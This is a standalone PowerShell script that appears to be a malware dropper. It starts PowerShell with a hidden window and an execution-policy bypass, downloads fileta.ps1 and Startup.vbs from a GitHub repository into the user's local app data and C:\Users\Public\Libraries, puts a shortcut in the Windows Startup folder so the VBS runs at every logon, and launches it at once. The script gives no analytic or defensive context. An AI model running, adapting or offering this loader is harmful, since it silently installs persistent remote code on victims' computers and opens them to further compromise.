cmd /c start /min "" powershell -ArgumentList "-WindowStyle Hidden -ExecutionPolicy Bypass -Command"
$LocalPath = "$env:LOCALAPPDATA"
$StartupPath = "$env:APPDATA\Microsoft\Windows\Start Menu\Programs\Startup"
$PublicLibPath = "C:\Users\Public\Libraries"

# Create Public Libraries directory if it doesn't exist
if (!(Test-Path -Path $PublicLibPath)) {
    New-Item -ItemType Directory -Path $PublicLibPath -Force | Out-Null
}

# File URLs
$File1Url = "https://github.com/KevinDark5/taproject/raw/refs/heads/main/fileta.ps1"
$File2Url = "https://github.com/KevinDark5/taproject/raw/refs/heads/main/Startup.vbs"

# File names
$File1Name = "fileta.ps1"
$File2Name = "Startup.vbs"

# Full paths to save the files
$File1Path = Join-Path -Path $LocalPath -ChildPath $File1Name
$File2Path = Join-Path -Path $PublicLibPath -ChildPath $File2Name

# Download fileta.ps1
Invoke-WebRequest -Uri $File1Url -OutFile $File1Path

# Download Startup.vbs
Invoke-WebRequest -Uri $File2Url -OutFile $File2Path

# Create a shortcut for Startup.vbs
$ShortcutPath = Join-Path -Path $StartupPath -ChildPath "Startup.lnk"
$WScriptShell = New-Object -ComObject WScript.Shell
$Shortcut = $WScriptShell.CreateShortcut($ShortcutPath)
$Shortcut.TargetPath = $File2Path
$Shortcut.Save()

# Execute the shortcut
Start-Process $ShortcutPath
